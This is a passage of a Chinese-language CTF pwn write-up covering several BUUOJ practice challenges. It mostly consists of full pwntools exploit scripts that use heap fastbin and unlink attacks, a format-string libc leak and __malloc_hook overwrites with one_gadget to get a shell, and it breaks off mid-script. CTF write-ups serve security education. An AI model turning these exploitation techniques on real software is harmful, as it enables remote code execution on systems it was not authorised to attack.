number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>ma_ <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>mh_a <span class=\"token operator\">=</span> ma_<span class=\"token operator\">-</span><span class=\"token number\">96</span> <span class=\"token operator\">-</span><span class=\"token number\">0x10</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'mallochook:'</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>mh_a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>obj <span class=\"token operator\">=</span> LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">,</span> mh_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>obj<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>libcbase <span class=\"token operator\">=</span> mh_a <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'base:'</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>libcbase<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>oglist <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0x4f2c5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4f322</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10a38c</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>onegadget <span class=\"token operator\">=</span> oglist<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> libcbase</pre></td></tr><tr><td data-num=\"65\"></td><td><pre></pre></td></tr><tr><td data-num=\"66\"></td><td><pre></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span>    <span class=\"token comment\">#3</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>mh_a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>onegadget<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>choose<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Size:'</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>suspend<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"hgame2018_flag_server\"><a class=\"markdownIt-Anchor\" href=\"#hgame2018_flag_server\">#</a> hgame2018_flag_server</h1>\n<p>ctypes 导入，直接同步算得随机值。</p>\n<h1 id=\"bsidescf-2019runit\"><a class=\"markdownIt-Anchor\" href=\"#bsidescf-2019runit\">#</a> [BSidesCF 2019]Runit</h1>\n<p>基础 shellcode</p>\n<h1 id=\"gyctf_2020_some_thing_interesting\"><a class=\"markdownIt-Anchor\" href=\"#gyctf_2020_some_thing_interesting\">#</a> gyctf_2020_some_thing_interesting</h1>\n<p>** 考点：**fastbin attack, malloc_hook, fmtstr</p>\n<p>开局有一次利用格式化字符串漏洞的机会，不过必须保证输入的前几位为指定字符串，否则会直接退出。因此只有 5 个字符可供利用，刚好泄露一个 libc 地址。</p>\n<p>然后利用 0x7f 在 malloc_hook 附近分配 chunk，修改其为 one_gadget。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher3 <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>filename <span class=\"token operator\">=</span> <span class=\"token string\">'gyctf_2020_some_thing_interesting'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>mode <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span> <span class=\"token keyword\">else</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">29877</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">if</span> mode<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token string\">'b *$rebase(0x15BA)'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">suspend</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">if</span> mode <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">choose</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'do :'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">mal</span><span class=\"token punctuation\">(</span>size1<span class=\"token punctuation\">,</span> size2<span class=\"token punctuation\">,</span> content1<span class=\"token operator\">=</span><span class=\"token string\">b'aaaa'</span><span class=\"token punctuation\">,</span>  content2<span class=\"token operator\">=</span><span class=\"token string\">b'bbbb'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'length : '</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'O : '</span><span class=\"token punctuation\">,</span> content1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'length : '</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'RE : '</span><span class=\"token punctuation\">,</span> content2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'ID : '</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">,</span> content1<span class=\"token punctuation\">,</span> content2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'ID : '</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'O : '</span><span class=\"token punctuation\">,</span> content1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'RE : '</span><span class=\"token punctuation\">,</span> content2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">dump</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'ID : '</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>checkstr <span class=\"token operator\">=</span> <span class=\"token string\">b'OreOOrereOOreO'</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'please:'</span><span class=\"token punctuation\">,</span> checkstr<span class=\"token operator\">+</span><span class=\"token string\">b'%17$p'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>choose<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>checkstr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>lsm_a <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">240</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>obj <span class=\"token operator\">=</span> LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">,</span>lsm_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>libcbase <span class=\"token operator\">=</span> lsm_a <span class=\"token operator\">-</span> obj<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>mh_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> obj<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>oglist <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0x45216</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4526a</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xf02a4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xf1147</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>onegadget <span class=\"token operator\">=</span> oglist<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> libcbase</pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x68</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x38</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>mh_a<span class=\"token operator\">-</span><span class=\"token number\">0x23</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x68</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'hahahaha'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token operator\">*</span><span class=\"token number\">0x13</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>onegadget<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>choose<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'length : '</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"zctf_2016_note3\"><a class=\"markdownIt-Anchor\" href=\"#zctf_2016_note3\">#</a> zctf_2016_note3</h1>\n<p>** 考点：** 条件判断漏洞，unlink</p>\n<p>** 版本：**libc6_2.23 amd64</p>\n<p>保护只开了 nx 和 canary，程序的地址可利用。</p>\n<p>输入函数存在漏洞，当传入的大小为 0 时，size-1 会被判为无限大，从而可以实现任意长度输入。</p>\n<p>利用该漏洞覆盖 size 的 inuse 部分，构造 unlink。</p>\n<p>由于 <code>malloc(0)</code>  默认分配 0x20 的 chunk，而 unlink 所需的两个 chunk 至少要容纳 6 个字长，因此将 0x20 的 chunk 放在大 chunk 之间或者前面均可。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>filename <span class=\"token operator\">=</span> <span class=\"token string\">'zctf_2016_note3'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>mode <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span> <span class=\"token keyword\">else</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">29786</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">if</span> mode<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token string\">'b *0x0400D47'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">suspend</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">if</span> mode <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">choose</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'>>\\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">mal</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">,</span> content<span class=\"token operator\">=</span><span class=\"token string\">b'aaaa'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'1024)\\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'content:\\n'</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'note:\\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'note:\\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'content:\\n'</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>ptr <span class=\"token operator\">=</span> <span class=\"token number\">0x6020C8</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>c3r <span class=\"token operator\">=</span> ptr<span class=\"token operator\">+</span><span class=\"token number\">3</span><span class=\"token operator\">*</span><span class=\"token number\">8</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>free_g <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'free'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td 